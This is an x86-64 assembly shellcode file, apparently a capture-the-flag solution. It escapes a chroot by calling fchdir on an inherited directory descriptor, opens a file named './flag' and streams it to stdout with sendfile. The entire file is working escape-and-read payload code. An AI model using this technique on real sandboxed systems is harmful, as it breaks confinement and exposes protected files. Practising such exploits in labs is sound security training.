.intel_syntax noprefix

.section .text
.global _start

_start:
    # fchdir(root_fd)
    mov rdi, 3
    mov rax, 0x51
    syscall

    # ./flag
    # 0x67616c662f2e
    mov rax, 0x67616c662f2e
    push rax

    # open('./flag', NULL, NULL)
    lea rdi, [rsp]
    mov rsi, 0
    mov rdx, 0
    mov rax, 2
    syscall
    mov rbx, rax

    # sendfile(1, flag_fd, 0, 1000)
    mov rdi, 1
    mov rsi, rax
    mov rdx, 0
    mov r10, 1000
    mov rax, 40
    syscall
